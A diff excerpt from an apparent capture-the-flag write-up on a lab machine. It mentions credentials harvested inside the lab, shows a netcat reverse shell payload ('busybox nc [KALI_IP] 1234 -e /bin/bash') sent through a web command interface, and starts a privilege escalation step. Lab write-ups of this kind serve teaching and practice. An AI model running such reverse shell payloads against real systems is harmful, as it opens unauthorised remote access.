@@ -41,9 +41,11 @@ Using the harvested credentials (`R1ckRul3s` : `Wubbalubbadubdub`), access to th
 
 The portal contained a command execution interface. To bypass web filter boundaries and stabilize the connection, a **Reverse Shell** was initiated using the following payload:
 
-```bash
+bash
 busybox nc [KALI_IP] 1234 -e /bin/bash
 Connection was successfully intercepted via a local Netcat listener as www-data.
+
+
 
 ⬆️ Privilege Escalation to ROOT
 After stabilizing the foothold, post-exploitation enumeration was conducted. Running sudo -l revealed a severe system misconfiguration:
